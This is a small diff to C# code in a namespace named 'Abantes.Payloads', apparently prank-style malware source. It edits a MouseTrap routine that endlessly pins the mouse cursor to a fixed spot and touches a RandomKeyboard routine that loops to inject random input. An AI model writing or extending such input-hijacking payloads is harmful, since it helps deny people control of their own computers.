@@ -36,9 +36,8 @@ namespace Abantes.Payloads
         static Random _random = new Random();
         public static void MouseTrap()
         {
-
-            Position.X = 0;
-            Position.Y = 0;
+            Position.X = 100;
+            Position.Y = 100;
             while (true)
             {
                 Cursor.Position = Position;
@@ -46,7 +45,6 @@ namespace Abantes.Payloads
         }
         public static void RandomKeyboard()
         {
-
             while (true)
             {
                 if (_random.Next(100) > 95)
